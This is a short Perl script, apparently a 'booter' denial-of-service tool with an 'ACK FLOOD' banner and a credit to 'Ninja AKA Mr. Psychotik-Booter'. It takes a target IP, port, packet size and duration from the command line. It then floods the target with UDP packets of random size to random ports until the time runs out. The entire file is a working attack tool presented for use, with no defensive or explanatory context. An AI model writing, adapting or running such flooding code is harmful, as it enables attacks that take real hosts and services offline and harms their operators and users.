#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
 

##
# Ran By Ninja AKA Mr. Psychotik-Booter
##

use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print BOLD BLUE<<EOTEXT;
    _    ____ _  __  _____ _     ___   ___  ____  
   / \  / ___| |/ / |  ___| |   / _ \ / _ \|  _ \ 
  / _ \| |   | ' /  | |_  | |  | | | | | | | | | |
 / ___ \ |___| . \  |  _| | |__| |_| | |_| | |_| |
/_/   \_\____|_|\_\ |_|   |_____\___/ \___/|____/ 
                                                  

EOTEXT



for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}